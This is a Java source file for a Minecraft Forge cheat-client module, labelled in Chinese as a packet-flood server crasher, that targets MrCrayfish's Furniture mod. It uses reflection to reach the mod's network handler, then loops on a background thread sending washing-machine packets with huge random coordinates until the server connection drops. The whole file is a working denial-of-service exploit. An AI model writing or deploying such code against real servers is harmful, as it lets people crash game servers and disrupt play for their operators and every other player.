package moe.badcat.module.modules;

import moe.badcat.module.BaseEnableModule;
import net.minecraft.client.Minecraft;
import net.minecraft.network.NetworkManager;
import net.minecraftforge.fml.common.network.simpleimpl.IMessage;
import net.minecraftforge.fml.common.network.simpleimpl.SimpleNetworkWrapper;

import java.util.Random;

public class ModuleCFMCrash extends BaseEnableModule {
    private Random random = new Random();

    private Class<?> class_PacketHandler;
    private Class<?> class_MessageWashingMachine;
    private SimpleNetworkWrapper instance_SimpleNetworkWrapper;

    public ModuleCFMCrash() {
        super("发包崩服", "MrCrayfish的家具");
    }

    @Override
    public boolean initModule() {
        try {
            class_PacketHandler = Class.forName("com.mrcrayfish.furniture.network.PacketHandler");
            instance_SimpleNetworkWrapper = (SimpleNetworkWrapper)class_PacketHandler.getField("INSTANCE").get(null);
            if (instance_SimpleNetworkWrapper == null) return false;

            class_MessageWashingMachine = Class.forName("com.mrcrayfish.furniture.network.message.MessageWashingMachine");

            return true;
        } catch (Exception ignored) {}
        return false;
    }

    @Override
    public void onUse() {
        super.onUse();

        if (isEnable()) {
            startSendPacketThread();
        }
    }

    public void startSendPacketThread() {
        NetworkManager networkManager = Minecraft.getMinecraft().getConnection().getNetworkManager();
        new Thread(() -> {
            while (enable && networkManager.isChannelOpen()) {
                try {
                    IMessage packet = (IMessage) class_MessageWashingMachine.getConstructor(int.class, int.class, int.class, int.class)
                            .newInstance(0, random.nextInt(50000) << 9, 100, random.nextInt(50000) << 9);
                    instance_SimpleNetworkWrapper.sendToServer(packet);
                } catch (Exception e) {
                    if (ModuleDebug.enable) e.printStackTrace();
                    break;
                }
                try { Thread.sleep(ModulePacketDelay.delay); } catch (InterruptedException ignored) { }
            }
            enable = false;
        }).start();
    }
}
